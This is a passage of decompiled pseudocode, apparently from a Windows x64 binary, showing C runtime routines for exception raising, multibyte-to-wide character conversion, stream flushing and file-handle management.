    {
      v5 = *a1 - 8LL;
      v2 = *(_BYTE **)(*(_QWORD *)v5 + 48LL);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 64LL))(v5);
    }
    v6 = nullptr;
    BaseOfImage = nullptr;
    if ( v2 != nullptr )
    {
      v6 = RtlPcToFileHeader(v2, &BaseOfImage);
      BaseOfImage = v6;
      if ( (*v2 & 8) != 0 || v6 == nullptr )
        v4 = 26820608;
    }
  }
  else
  {
    v6 = nullptr;
    v2 = nullptr;
    BaseOfImage = nullptr;
  }
  Arguments[0] = v4;
  Arguments[1] = (ULONG_PTR)a1;
  Arguments[2] = (ULONG_PTR)v2;
  Arguments[3] = (ULONG_PTR)v6;
  RaiseException(0xE06D7363, 1u, 4u, Arguments);
}


// ----- sub_140020560 @ 0x140020560 -----
// attributes: thunk
LPVOID __fastcall sub_140020560(unsigned __int64 a1, unsigned __int64 a2)
{
  return sub_14001B510(a1, a2);
}


// ----- sub_140020570 @ 0x140020570 -----
// attributes: thunk
void __fastcall sub_140020570(LPVOID lpMem)
{
  sub_14001B590(lpMem);
}


// ----- sub_140020580 @ 0x140020580 -----
// attributes: thunk
LPVOID __fastcall sub_140020580(unsigned __int64 a1)
{
  return sub_14001C800(a1);
}


// ----- sub_140020590 @ 0x140020590 -----
__int64 __fastcall sub_140020590(_BYTE *a1, __int64 a2, __int64 a3)
{
  _BYTE *v3; // r9
  __int64 v5; // r8
  char v6; // al

  v3 = a1;
  if ( a1 == nullptr || a2 == 0 )
    goto LABEL_5;
  if ( a3 == 0 )
  {
    *a1 = 0;
LABEL_5:
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
    return 22;
  }
  v5 = a3 - (_QWORD)a1;
  while ( 1 )
  {
    v6 = a1[v5];
    *a1++ = v6;
    if ( v6 == 0 )
      break;
    if ( --a2 == 0 )
    {
      *v3 = 0;
      *(_DWORD *)sub_14001A8F0() = 34;
      sub_14001A770();
      return 34;
    }
  }
  return 0;
}


// ----- sub_140020610 @ 0x140020610 -----
__int64 __fastcall sub_140020610(WCHAR *a1, const CHAR *a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v8; // rdx
  UINT v9; // r10d
  __int64 result; // rax
  int v11; // r9d

  if ( a2 == nullptr || a3 == 0 )
  {
    qword_1400278A8 = 0;
    return 0;
  }
  if ( *a2 == 0 )
  {
    if ( a1 != nullptr )
      *a1 = 0;
    return 0;
  }
  if ( *(_BYTE *)(a4 + 40) == 0 )
    sub_14001D7A0(a4);
  v8 = *(_QWORD *)(a4 + 24);
  v9 = *(_DWORD *)(v8 + 12);
  if ( v9 != 65001 )
  {
    if ( *(_QWORD *)(v8 + 312) == 0 )
    {
      if ( a1 != nullptr )
        *a1 = *(unsigned __int8 *)a2;
      return 1;
    }
    if ( *(__int16 *)(*(_QWORD *)v8 + 2LL * *(unsigned __int8 *)a2) >= 0 )
    {
      if ( sub_14001CBF8(v9, 9, a2, 1, a1, a1 != nullptr) != 0 )
        return 1;
    }
    else
    {
      v11 = *(_DWORD *)(v8 + 8);
      if ( v11 > 1 && (int)a3 >= v11 && sub_14001CBF8(v9, 9, a2, v11, a1, a1 != nullptr) != 0
        || a3 >= *(int *)(*(_QWORD *)(a4 + 24) + 8LL) && a2[1] != 0 )
      {
        return *(unsigned int *)(*(_QWORD *)(a4 + 24) + 8LL);
      }
    }
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 42;
    return 0xFFFFFFFFLL;
  }
  result = sub_140020980((_DWORD)a1, (_DWORD)a2, a3, (unsigned int)&qword_1400278A8, a4);
  if ( (int)result < 0 )
    return 0xFFFFFFFFLL;
  return result;
}


// ----- sub_140020788 @ 0x140020788 -----
char __fastcall sub_140020788(char *a1)
{
  char v1; // dl
  char result; // al

  v1 = *a1;
  if ( *a1 >= 0 )
    return *a1 != 0;
  if ( (v1 & 0xE0) == 0xC0 )
    return 2;
  if ( (v1 & 0xF0) == 0xE0 )
    return 3;
  result = -1;
  if ( (v1 & 0xF8) == 0xF0 )
    return 4;
  return result;
}


// ----- sub_1400207C0 @ 0x1400207c0 -----
__int64 __fastcall sub_1400207C0(__int64 a1, char *a2, unsigned __int64 a3, _BYTE *a4, __int64 a5)
{
  _BYTE *v5; // rbx
  char *v6; // rdi
  unsigned __int64 v8; // rbp
  _DWORD *v9; // r14
  int v11; // eax
  int v12; // eax
  unsigned int v13; // edx
  unsigned __int64 v14; // r10
  char v15; // cl
  _DWORD v16[2]; // [rsp+18h] [rbp-60h]
  __int64 v17; // [rsp+20h] [rbp-58h]
  int v18; // [rsp+28h] [rbp-50h]

  v5 = &unk_1400278B0;
  v6 = (char *)&word_1400083D2;
  if ( a4 != nullptr )
    v5 = a4;
  v8 = 1;
  if ( a2 != nullptr )
  {
    v8 = a3;
    v6 = a2;
  }
  v9 = (_DWORD *)(a1 & -(__int64)(a2 != nullptr));
  if ( v8 == 0 )
    return -2;
  if ( *((_WORD *)v5 + 3) != 0 )
  {
    LOBYTE(a3) = v5[4];
    v13 = *(_DWORD *)v5;
    LOBYTE(a4) = v5[6];
    if ( (unsigned __int8)(a3 - 2) > 2u || (_BYTE)a4 == 0 || (unsigned __int8)a4 >= (unsigned __int8)a3 )
      return sub_140020D44(v5, a5, a3, a4, v17, v18);
    goto LABEL_17;
  }
  LOBYTE(v11) = sub_140020788(v6);
  a3 = v11;
  v12 = (unsigned __int8)*v6++;
  if ( (unsigned int)a3 > 1 )
  {
    if ( (unsigned int)(a3 - 2) > 2 )
      return sub_140020D44(v5, a5, a3, a4, v17, v18);
    LOBYTE(a4) = a3;
    v13 = v12 & ((1 << (7 - a3)) - 1);
LABEL_17:
    v14 = (unsigned __int8)a4;
    if ( (unsigned __int8)a4 >= v8 )
      v14 = v8;
    while ( v6 - a2 < v14 )
    {
      v15 = *v6++;
      if ( (v15 & 0xC0) != 0x80 )
        return sub_140020D44(v5, a5, a3, a4, v17, v18);
      v13 = (v13 << 6) | v15 & 0x3F;
    }
    if ( v14 < (unsigned __int8)a4 )
    {
      *((_WORD *)v5 + 2) = (unsigned __int8)a3;
      *((_WORD *)v5 + 3) = (unsigned __int8)((_BYTE)a4 - v14);
      *(_DWORD *)v5 = v13;
      return -2;
    }
    if ( v13 - 55296 > 0x7FF && v13 < 0x110000 )
    {
      v17 = 0x80000000080LL;
      v18 = 0x10000;
      if ( v13 >= v16[(unsigned __int8)a3] )
      {
        if ( v9 != nullptr )
          *v9 = v13;
        return sub_140020D3C((unsigned __int8)a4 & (unsigned __int64)-(__int64)(v13 != 0), v5);
      }
    }
    return sub_140020D44(v5, a5, a3, a4, v17, v18);
  }
  if ( v9 != nullptr )
    *v9 = v12;
  return a3;
}


// ----- sub_140020980 @ 0x140020980 -----
unsigned __int64 __fastcall sub_140020980(__int16 *a1, char *a2, unsigned __int64 a3, _BYTE *a4, __int64 a5)
{
  unsigned __int64 result; // rax
  __int16 v7; // cx
  unsigned int v8[6]; // [rsp+30h] [rbp-18h] BYREF

  v8[0] = 0;
  result = sub_1400207C0((__int64)v8, a2, a3, a4, a5);
  if ( result <= 4 )
  {
    v7 = v8[0];
    if ( v8[0] > 0xFFFF )
      v7 = -3;
    if ( a1 != nullptr )
      *a1 = v7;
  }
  return result;
}


// ----- sub_1400209C8 @ 0x1400209c8 -----
__int64 __fastcall sub_1400209C8(_WORD *a1, char **a2, unsigned __int64 a3, _BYTE *a4, __int64 a5)
{
  char *v5; // rdi
  unsigned __int64 v7; // rsi
  _WORD *v10; // rbx
  __int64 v11; // r15
  unsigned __int64 v12; // r8
  __int64 v13; // rax
  __int16 v14; // cx
  unsigned int v15; // ecx
  __int64 i; // rbx
  __int64 v18; // rsi
  unsigned __int64 v19; // r8
  __int64 v20; // rax
  __int64 v21; // rcx
  unsigned int v22; // [rsp+60h] [rbp+8h] BYREF

  v5 = *a2;
  v7 = a3;
  if ( a1 == nullptr )
  {
    v18 = a5;
    for ( i = 0; ; i = v21 + 1 )
    {
      if ( *v5 != 0 )
        v19 = v5[1] != 0 ? (v5[2] != 0) + 3LL : 2LL;
      else
        v19 = 1;
      v20 = sub_1400207C0(0, v5, v19, a4, v18);
      if ( v20 == -1 )
        break;
      if ( v20 == 0 )
        return i;
      v21 = i + 1;
      v5 += v20;
      if ( v20 != 4 )
        v21 = i;
    }
    *(_BYTE *)(v18 + 48) = 1;
    *(_DWORD *)(v18 + 44) = 42;
    return -1;
  }
  v10 = a1;
  if ( a3 != 0 )
  {
    v11 = a5;
    while ( 1 )
    {
      if ( *v5 != 0 )
        v12 = v5[1] != 0 ? (v5[2] != 0) + 3LL : 2LL;
      else
        v12 = 1;
      v22 = 0;
      v13 = sub_1400207C0((__int64)&v22, v5, v12, a4, v11);
      if ( v13 == -1 )
        break;
      if ( v13 == 0 )
      {
        v5 = nullptr;
        *v10 = 0;
        goto LABEL_15;
      }
      v14 = v22;
      if ( v22 > 0xFFFF )
      {
        if ( v7 <= 1 )
          goto LABEL_15;
        v15 = v22 - 0x10000;
        v22 = v15;
        --v7;
        *v10++ = (v15 >> 10) | 0xD800;
        v14 = v15 & 0x3FF | 0xDC00;
      }
      *v10 = v14;
      v5 += v13;
      ++v10;
      if ( --v7 == 0 )
        goto LABEL_15;
    }
    *a2 = v5;
    *(_BYTE *)(v11 + 48) = 1;
    *(_DWORD *)(v11 + 44) = 42;
    return -1;
  }
LABEL_15:
  *a2 = v5;
  return v10 - a1;
}


// ----- sub_140020B80 @ 0x140020b80 -----
__int64 __fastcall sub_140020B80(__int64 a1)
{
  if ( a1 != 0 )
    return *(unsigned int *)(a1 + 24);
  *(_DWORD *)sub_14001A8F0() = 22;
  sub_14001A770();
  return 0xFFFFFFFFLL;
}


// ----- sub_140020BA8 @ 0x140020ba8 -----
__int64 sub_140020BA8()
{
  int v0; // eax
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v4; // rbp
  _DWORD *v5; // rsi
  char *v6; // r14

  v0 = dword_1400278B8;
  v1 = 0;
  v2 = 3;
  if ( dword_1400278B8 == 0 )
  {
    v0 = 512;
LABEL_5:
    dword_1400278B8 = v0;
    goto LABEL_6;
  }
  if ( dword_1400278B8 < 3 )
  {
    v0 = 3;
    goto LABEL_5;
  }
LABEL_6:
  lpMem = sub_14001B510(v0, 8u);
  sub_14001B590(nullptr);
  if ( lpMem == nullptr )
  {
    dword_1400278B8 = 3;
    lpMem = sub_14001B510(3u, 8u);
    sub_14001B590(nullptr);
    if ( lpMem == nullptr )
      return 0xFFFFFFFFLL;
  }
  v4 = 0;
  v5 = &unk_140026E38;
  v6 = (char *)&unk_140026E20;
  do
  {
    InitializeCriticalSectionEx((LPCRITICAL_SECTION)(v6 + 48), 0xFA0u, 0);
    *(_QWORD *)((char *)lpMem + v1) = v6;
    if ( *(_QWORD *)(qword_1400278D0[v4 >> 6] + 72 * (v4 & 0x3F) + 40) >= 0xFFFFFFFFFFFFFFFEuLL
      || *(_QWORD *)(qword_1400278D0[v4 >> 6] + 72 * (v4 & 0x3F) + 40) == 0 )
    {
      *v5 = -2;
    }
    ++v4;
    v6 += 88;
    v1 += 8;
    v5 += 22;
    --v2;
  }
  while ( v2 != 0 );
  return 0;
}


// ----- sub_140020CC8 @ 0x140020cc8 -----
void sub_140020CC8()
{
  __int64 i; // rbx

  sub_14002114C();
  sub_140020D58();
  for ( i = 0; i != 24; i += 8 )
  {
    sub_140021154(*(_QWORD *)((char *)lpMem + i));
    DeleteCriticalSection((LPCRITICAL_SECTION)(*(_QWORD *)((char *)lpMem + i) + 48LL));
  }
  sub_14001B590(lpMem);
  lpMem = nullptr;
}


// ----- sub_140020D24 @ 0x140020d24 -----
void __fastcall sub_140020D24(__int64 a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}


// ----- sub_140020D30 @ 0x140020d30 -----
void __fastcall sub_140020D30(__int64 a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}


// ----- sub_140020D3C @ 0x140020d3c -----
__int64 __fastcall sub_140020D3C(__int64 a1, _QWORD *a2)
{
  *a2 = 0;
  return a1;
}


// ----- sub_140020D44 @ 0x140020d44 -----
__int64 __fastcall sub_140020D44(_QWORD *a1, __int64 a2)
{
  *a1 = 0;
  *(_BYTE *)(a2 + 48) = 1;
  *(_DWORD *)(a2 + 44) = 42;
  return -1;
}


// ----- sub_140020D58 @ 0x140020d58 -----
__int64 sub_140020D58()
{
  int i; // ebx
  __int64 v1; // rax
  unsigned int v3; // [rsp+20h] [rbp-18h]

  v3 = 0;
  sub_14001B374(8);
  for ( i = 3; i != dword_1400278B8; ++i )
  {
    v1 = *((_QWORD *)lpMem + i);
    if ( v1 != 0 )
    {
      if ( (*(_DWORD *)(v1 + 20) & 0x2000) != 0 && (unsigned int)sub_1400214A4(*((_QWORD *)lpMem + i)) != -1 )
        ++v3;
      DeleteCriticalSection((LPCRITICAL_SECTION)(*((_QWORD *)lpMem + i) + 48LL));
      sub_14001B590(*((LPVOID *)lpMem + i));
      *((_QWORD *)lpMem + i) = 0;
    }
  }
  sub_14001B390(8);
  return v3;
}


// ----- sub_140020E0C @ 0x140020e0c -----
void __fastcall sub_140020E0C(__int64 a1, __int64 *a2, __int64 **a3, __int64 *a4)
{
  __int64 *v6; // rdx
  __int64 v7; // rcx
  int v8; // ecx

  sub_140020D24(*a2);
  v6 = a3[1];
  v7 = **a3;
  if ( v7 != 0 )
  {
    v8 = *(_DWORD *)(v7 + 20);
    if ( (v8 & 0x2000) != 0 )
    {
      if ( (v8 & 3) == 2 && (v8 & 0xC0) != 0 || (v8 & 0x800) != 0 )
      {
        if ( *(_BYTE *)a3[2] != 0 || (*(_DWORD *)(**a3 + 20) & 2) != 0 )
        {
          if ( (unsigned int)sub_140021078(**a3, v6) == -1 )
            *(_DWORD *)a3[3] = -1;
          else
            ++*(_DWORD *)a3[1];
        }
      }
      else
      {
        ++*(_DWORD *)v6;
      }
    }
  }
  sub_140020D30(*a4);
}


// ----- sub_140020EA8 @ 0x140020ea8 -----
void __fastcall sub_140020EA8(__int64 a1, int *a2, __int64 **a3, int *a4)
{
  __int64 *v6; // rbx
  __int64 *v7; // r14
  __int64 v8; // rcx
  int v9; // ecx
  __int64 *v10; // rdx
  __int64 *v11; // rcx
  __int64 *v12; // rax
  __int64 v13; // [rsp+20h] [rbp-58h] BYREF
  __int64 v14; // [rsp+28h] [rbp-50h] BYREF
  __int64 v15[2]; // [rsp+30h] [rbp-48h] BYREF
  __int64 *v16[7]; // [rsp+40h] [rbp-38h] BYREF
  char v17; // [rsp+88h] [rbp+10h] BYREF
  int *v18; // [rsp+98h] [rbp+20h]

  v18 = a4;
  sub_14001B374(*a2);
  v6 = (__int64 *)lpMem;
  v7 = (__int64 *)((char *)lpMem + 8 * dword_1400278B8);
  while ( 1 )
  {
    v15[1] = (__int64)v6;
    if ( v6 == v7 )
      break;
    v8 = *v6;
    v13 = v8;
    if ( v8 != 0 )
    {
      v9 = *(_DWORD *)(v8 + 20);
      if ( (v9 & 0x2000) != 0 )
      {
        if ( (v9 & 3) == 2 && (v9 & 0xC0) != 0 || (v9 & 0x800) != 0 )
        {
          v10 = a3[2];
          v11 = a3[1];
          v12 = *a3;
          v16[0] = &v13;
          v16[1] = v12;
          v16[2] = v11;
          v16[3] = v10;
          v14 = v13;
          v15[0] = v13;
          sub_140020E0C((__int64)&v17, v15, v16, &v14);
        }
        else
        {
          ++*(_DWORD *)*a3;
        }
      }
    }
    ++v6;
  }
  sub_14001B390(*a4);
}


// ----- sub_140020F8C @ 0x140020f8c -----
__int64 __fastcall sub_140020F8C(char a1)
{
  __int64 result; // rax
  int v2; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+24h] [rbp-1Ch] BYREF
  __int64 *v4[3]; // [rsp+28h] [rbp-18h] BYREF
  char v5; // [rsp+50h] [rbp+10h] BYREF
  char v6; // [rsp+58h] [rbp+18h] BYREF
  unsigned int v7; // [rsp+60h] [rbp+20h] BYREF
  unsigned int v8; // [rsp+68h] [rbp+28h] BYREF

  v5 = a1;
  v8 = 0;
  v7 = 0;
  v4[0] = (__int64 *)&v8;
  v4[1] = (__int64 *)&v5;
  v4[2] = (__int64 *)&v7;
  v2 = 8;
  v3 = 8;
  sub_140020EA8((__int64)&v6, &v3, v4, &v2);
  result = v7;
  if ( v5 != 0 )
    return v8;
  return result;
}


// ----- sub_140020FEC @ 0x140020fec -----
__int64 __fastcall sub_140020FEC(__int64 a1, __int64 a2)
{
  int v4; // ecx
  int v5; // edi
  __int64 v6; // rsi
  unsigned int v7; // eax

  v4 = *(_DWORD *)(a1 + 20);
  if ( (v4 & 3) == 2 && (v4 & 0xC0) != 0 )
  {
    v5 = *(_DWORD *)a1 - *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 16) = 0;
    v6 = *(_QWORD *)(a1 + 8);
    *(_QWORD *)a1 = v6;
    if ( v5 > 0 )
    {
      v7 = sub_140020B80(a1);
      if ( v5 != (unsigned int)sub_140021E88(v7, v6, (unsigned int)v5, a2) )
      {
        _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x10u);
        return 0xFFFFFFFFLL;
      }
      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )
        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFD);
    }
  }
  return 0;
}


// ----- sub_140021078 @ 0x140021078 -----
__int64 __fastcall sub_140021078(__int64 a1)
{
  unsigned int v2; // edi
  unsigned int v3; // eax
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400274CC == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_140026798;
  }
  if ( a1 != 0 )
  {
    if ( (unsigned int)sub_140020FEC(a1, (__int64)v7) != 0
      || (*(_DWORD *)(a1 + 20) & 0x800) != 0 && (v3 = sub_140020B80(a1), (unsigned int)sub_1400215C8(v3) != 0) )
    {
      v2 = -1;
    }
    else
    {
      v2 = 0;
    }
  }
  else
  {
    v2 = sub_140020F8C(0);
  }
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(sub_14001A38C((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(sub_14001A38C((__int64)v7) + 36) = v5;
  }
  return v2;
}


// ----- sub_14002114C @ 0x14002114c -----
__int64 sub_14002114C()
{
  return sub_140020F8C(1);
}


// ----- sub_140021154 @ 0x140021154 -----
__int64 __fastcall sub_140021154(__int64 a1)
{
  __int64 result; // rax

  result = *(_DWORD *)(a1 + 20) >> 13;
  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
  {
    result = *(_DWORD *)(a1 + 20) >> 6;
    if ( (*(_DWORD *)(a1 + 20) & 0x40) != 0 )
    {
      sub_14001B590(*(LPVOID *)(a1 + 8));
      _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFEBF);
      *(_QWORD *)(a1 + 8) = 0;
      *(_QWORD *)a1 = 0;
      *(_DWORD *)(a1 + 16) = 0;
      return 0;
    }
  }
  return result;
}


// ----- sub_140021198 @ 0x140021198 -----
__int64 __fastcall sub_140021198(int a1)
{
  if ( a1 == -2 )
  {
    *(_DWORD *)sub_14001A8F0() = 9;
  }
  else
  {
    if ( a1 >= 0 && a1 < (unsigned int)dword_140027CD0 )
      return *(_BYTE *)(qword_1400278D0[(unsigned __int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 0x40;
    *(_DWORD *)sub_14001A8F0() = 9;
    sub_14001A770();
  }
  return 0;
}


// ----- sub_1400211F8 @ 0x1400211f8 -----
void __fastcall sub_1400211F8(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(qword_1400278D0[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));
}


// ----- sub_140021220 @ 0x140021220 -----
void __fastcall sub_140021220(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_1400278D0[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));
}


// ----- sub_140021248 @ 0x140021248 -----
__int64 __fastcall sub_140021248(int a1)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  __int64 v4; // rax
  int v5; // ebx
  DWORD v6; // ecx

  if ( a1 >= 0 && a1 < (unsigned int)dword_140027CD0 )
  {
    v2 = (unsigned __int64)a1 >> 6;
    v3 = 9LL * (a1 & 0x3F);
    v4 = qword_1400278D0[v2];
    if ( (*(_BYTE *)(v4 + 72LL * (a1 & 0x3F) + 56) & 1) != 0 && *(_QWORD *)(v4 + 72LL * (a1 & 0x3F) + 40) != -1 )
    {
      if ( (unsigned int)sub_140022390() == 1 )
      {
        if ( a1 == 0 )
        {
          v6 = -10;
          goto LABEL_12;
        }
        v5 = a1 - 1;
        if ( v5 == 0 )
        {
          v6 = -11;
          goto LABEL_12;
        }
        if ( v5 == 1 )
        {
          v6 = -12;
LABEL_12:
          SetStdHandle(v6, nullptr);
        }
      }
      *(_QWORD *)(qword_1400278D0[v2] + 8 * v3 + 40) = -1;
      return 0;
    }
  }
  *(_DWORD *)sub_14001A8F0() = 9;
  *(_DWORD *)sub_14001A8CC() = 0;
  return 0xFFFFFFFFLL;
}


// ----- sub_140021304 @ 0x140021304 -----
__int64 __fastcall sub_140021304(int a1)
{
  unsigned __int64 v1; // rax
  __int64 v2; // rcx
  __int64 v3; // rax

  if ( a1 == -2 )
  {
    *(_DWORD *)sub_14001A8CC() = 0;
    *(_DWORD *)sub_14001A8F0() = 9;
  }
  else
  {
    if ( a1 >= 0 && a1 < (unsigned int)dword_140027CD0 )
    {
      v1 = a1;
      v2 = a1 & 0x3F;
      v3 = qword_1400278D0[v1 >> 6];
      if ( (*(_BYTE *)(v3 + 72 * v2 + 56) & 1) != 0 )
        return *(_QWORD *)(v3 + 72 * v2 + 40);
    }
    *(_DWORD *)sub_14001A8CC() = 0;
    *(_DWORD *)sub_14001A8F0() = 9;
    sub_14001A770();
  }
  return -1;
}


// ----- sub_140021380 @ 0x140021380 -----
__int64 __fastcall sub_140021380(__int64 a1, __int64 a2)
{
  unsigned int v5; // edi

  if ( a1 == 0 )
  {
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 22;
    sub_14001A6B8(0, 0, 0, 0, 0, a2);
    return 0xFFFFFFFFLL;
  }
  if ( (*(_DWORD *)(a1 + 20) & 0x1000) != 0 )
  {
    sub_140022660();
    return 0xFFFFFFFFLL;
  }
  sub_140020D24(a1);
  v5 = sub_1400213FC(a1, a2);
  sub_140020D30(a1);
  return v5;
}


// ----- sub_1400213FC @ 0x1400213fc -----
__int64 __fastcall sub_1400213FC(__int64 a1, __int64 a2)
{
  unsigned int v5; // esi
  unsigned int v6; // eax
  void *v7; // rcx

  if ( a1 != 0 )
  {
    v5 = -1;
    if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
    {
      v5 = sub_140020FEC(a1, a2);
      sub_140021154(a1);
      v6 = sub_140020B80(a1);
      if ( (int)sub_1400224CC(v6, a2) >= 0 )
      {
        v7 = *(void **)(a1 + 40);
        if ( v7 != nullptr )
        {
          sub_14001B590(v7);
          *(_QWORD *)(a1 + 40) = 0;
        }
      }
      else
      {
        v5 = -1;
      }
    }
    sub_140022660(a1);
    return v5;
  }
  else
  {
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 22;
    sub_14001A6B8(0, 0, 0, 0, 0, a2);
    return 0xFFFFFFFFLL;
  }
}


// ----- sub_1400214A4 @ 0x1400214a4 -----
__int64 __fastcall sub_1400214A4(__int64 a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ebx
  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF
  char v6; // [rsp+30h] [rbp-30h]
  __int128 v7; // [rsp+38h] [rbp-28h]
  char v8; // [rsp+48h] [rbp-18h]
  int v9; // [rsp+4Ch] [rbp-14h]
  char v10; // [rsp+50h] [rbp-10h]
  int v11; // [rsp+54h] [rbp-Ch]
  char v12; // [rsp+58h] [rbp-8h]

  v5[0] = 0;
  v6 = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  if ( dword_1400274CC == 0 )
  {
    v8 = 1;
    v7 = *(_OWORD *)&off_140026798;
  }
  v1 = sub_140021380(a1, (__int64)v5);
  if ( v8 == 2 )
    *(_DWORD *)(v5[0] + 936LL) &= ~2u;
  if ( v10 != 0 )
  {
    v2 = v9;
    *(_DWORD *)(sub_14001A38C((__int64)v5) + 32) = v2;
  }
  if ( v12 != 0 )
  {
    v3 = v11;
    *(_DWORD *)(sub_14001A38C((__int64)v5) + 36) = v3;
  }
  return v1;
}


// ----- sub_14002153C @ 0x14002153c -----
__int64 __fastcall sub_14002153C(__int64 a1, int *a2, int **a3, int *a4)
{
  void *v6; // rax
  unsigned int v7; // ebx
  DWORD LastError; // ebx

  sub_1400211F8(*a2);
  if ( (*(_BYTE *)(qword_1400278D0[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) == 0 )
    goto LABEL_4;
  v6 = (void *)sub_140021304(**a3);
  v7 = 0;
  if ( !FlushFileBuffers(v6) )
  {
    LastError = GetLastError();
    *(_DWORD *)sub_14001A8CC() = LastError;
LABEL_4:
    *(_DWORD *)sub_14001A8F0() = 9;
    v7 = -1;
  }
  sub_140021220(*a4);
  return v7;
}


// ----- sub_1400215C8 @ 0x1400215c8 -----
__int64 __fastcall sub_1400215C8(int a1)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  if ( a1 == -2 )
  {
    *(_DWORD *)sub_14001A8F0() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_140027CD0
      && (*(_BYTE *)(qword_1400278D0[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
    {
      v5 = a1;
      v6 = a1;
      v2 = &v3;
      return sub_14002153C((__int64)&v4, &v6, &v2, &v5);
    }
    *(_DWORD *)sub_14001A8F0() = 9;
    sub_14001A770();
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_14002165C @ 0x14002165c -----
__int64 __fastcall sub_14002165C(__int64 a1, int a2, char *a3, int a4, __int64 a5)
{
  char *v5; // rsi
  __int64 v6; // r14
  __int64 v8; // r13
  __int64 v9; // r15
  unsigned __int64 v10; // r12
  int v11; // edi
  __int64 v12; // r10
  int v13; // ecx
  __int64 v14; // r11
  int v15; // edx
  unsigned int v16; // r12d
  int v17; // edx
  __int64 v18; // r14
  _BYTE *v19; // rcx
  int v20; // r12d
  __int64 v21; // r8
  __int64 v22; // r9
  __int64 v23; // rcx
  _BYTE *v24; // rdx
  __int64 i; // rdx
  __int64 v26; // r13
  __int64 v27; // r9
  unsigned int v28; // r14d
  __int64 v29; // r8
  char v30; // cl
  unsigned __int64 v31; // r8
  const CHAR *v32; // rdx
  __int64 v33; // r9
  DWORD v34; // eax
  DWORD v35; // r14d
  HANDLE v36; // r12
  char *v37; // rsi
  __int64 v38; // r8
  __int64 v39; // r10
  __int16 v41[2]; // [rsp+48h] [rbp-71h] BYREF
  int v42; // [rsp+4Ch] [rbp-6Dh] BYREF
  DWORD NumberOfBytesWritten; // [rsp+50h] [rbp-69h] BYREF
  unsigned __int64 v44; // [rsp+58h] [rbp-61h]
  __int64 v45; // [rsp+60h] [rbp-59h]
  __int64 v46; // [rsp+68h] [rbp-51h] BYREF
  UINT ConsoleOutputCP; // [rsp+70h] [rbp-49h]
  int v48; // [rsp+74h] [rbp-45h]
  char *v49; // [rsp+78h] [rbp-41h]
  __int64 v50; // [rsp+80h] [rbp-39h]
  __int64 v51; // [rsp+88h] [rbp-31h] BYREF
  char *v52; // [rsp+90h] [rbp-29h] BYREF
  char *v53; // [rsp+98h] [rbp-21h] BYREF
  HANDLE hFile; // [rsp+A0h] [rbp-19h]
  __int64 v55; // [rsp+A8h] [rbp-11h]
  __int64 v56; // [rsp+B0h] [rbp-9h]
  _BYTE v57[8]; // [rsp+B8h] [rbp-1h] BYREF
  _BYTE v58[8]; // [rsp+C0h] [rbp+7h] BYREF
  CHAR Buffer[8]; // [rsp+C8h] [rbp+Fh] BYREF

  v56 = -2;
  v5 = a3;
  v49 = a3;
  v6 = a2;
  v45 = a5;
  v8 = (__int64)a2 >> 6;
  v50 = v8;
  v9 = 9LL * (a2 & 0x3F);
  hFile = *(HANDLE *)(qword_1400278D0[v8] + 72LL * (a2 & 0x3F) + 40);
  v10 = (unsigned __int64)&a3[a4];
  v44 = v10;
  ConsoleOutputCP = GetConsoleOutputCP();
  v11 = 0;
  v12 = a5;
  if ( *(_BYTE *)(a5 + 40) == 0 )
  {
    sub_14001D7A0(v45);
    v12 = v45;
  }
  v13 = *(_DWORD *)(*(_QWORD *)(v12 + 24) + 12LL);
  v48 = v13;
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
